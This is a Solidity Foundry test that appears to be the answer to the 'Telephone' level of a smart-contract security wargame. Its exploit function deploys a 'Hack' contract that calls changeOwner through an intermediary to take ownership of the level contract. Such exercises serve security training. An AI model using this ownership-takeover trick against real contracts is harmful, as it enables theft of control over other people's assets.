// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Telephone.sol";
import "src/levels/TelephoneFactory.sol";

contract TestTelephone is BaseTest {
    Telephone private level;
    Hack public hackContract;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Telephone(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Deploy the Exploiter contract
        hackContract = new Hack();
        hackContract.changeOwner(levelAddress, address(player));

        vm.stopPrank();
    }
}

contract Hack {
    function changeOwner(address _contract, address _owner) public {
        ITelephone telContract = ITelephone(_contract);
        telContract.changeOwner(_owner);
    }
}


interface ITelephone {
    function changeOwner(address _owner) external;
}

